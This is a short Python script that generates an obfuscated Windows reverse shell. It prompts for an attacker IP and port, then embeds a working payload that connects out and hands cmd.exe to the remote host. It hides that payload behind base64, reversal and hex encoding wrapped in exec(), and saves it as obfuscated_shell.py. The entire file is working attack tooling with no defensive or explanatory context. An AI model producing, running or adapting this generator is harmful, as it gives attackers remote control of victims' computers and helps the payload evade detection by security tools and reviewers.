import base64
import binascii

def main():
    # Get user input
    host = input("Enter the target IP: ")
    port = input("Enter the target port: ")
    
    # Validate port is a number
    try:
        port = int(port)
    except ValueError:
        print("Port must be a number!")
        return
    
    # Windows 11 compatible reverse shell
    code = f"""
import socket
import subprocess
import threading
import time
import sys

def send_data(sock, data):
    try:
        sock.send(data)
    except:
        pass

def receive_data(sock):
    try:
        return sock.recv(4096)
    except:
        return None

def run_shell(sock):
    try:
        # Create a new process with explicit I/O handles
        proc = subprocess.Popen(
            'cmd.exe',
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=True,
            text=False,
            bufsize=0
        )
        
        # Thread to read from process stdout and send to socket
        def stdout_reader():
            while True:
                try:
                    data = proc.stdout.read(1)
                    if not data:
                        break
                    send_data(sock, data)
                except:
                    break
        
        # Thread to read from socket and write to process stdin
        def stdin_writer():
            while True:
                try:
                    data = receive_data(sock)
                    if not data:
                        break
                    proc.stdin.write(data)
                    proc.stdin.flush()
                except:
                    break
        
        # Start threads
        t1 = threading.Thread(target=stdout_reader)
        t2 = threading.Thread(target=stdin_writer)
        t1.daemon = True
        t2.daemon = True
        t1.start()
        t2.start()
        
        # Keep the main thread alive
        while t1.is_alive() and t2.is_alive():
            time.sleep(0.1)
            
    except Exception as e:
        pass

# Main connection
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{host}', {port}))
    run_shell(s)
except:
    sys.exit(0)
"""
    
    # Obfuscation techniques
    # 1. Base64 encoding
    b64_code = base64.b64encode(code.encode()).decode()
    
    # 2. String reversal
    reversed_b64 = b64_code[::-1]
    
    # 3. Hex encoding
    hex_encoded = reversed_b64.encode().hex()
    
    # Create the final obfuscated payload
    payload = f"""
import base64,binascii
exec(base64.b64decode(binascii.unhexlify('{hex_encoded}')[::-1]).decode())
"""
    
    print("\n" + "="*60)
    print("Obfuscated Reverse Shell Code:")
    print("="*60)
    print(payload)
    
    # Save to a file
    with open("obfuscated_shell.py", "w") as f:
        f.write(payload)
    print("\nSaved to 'obfuscated_shell.py'")

if __name__ == "__main__":
    main()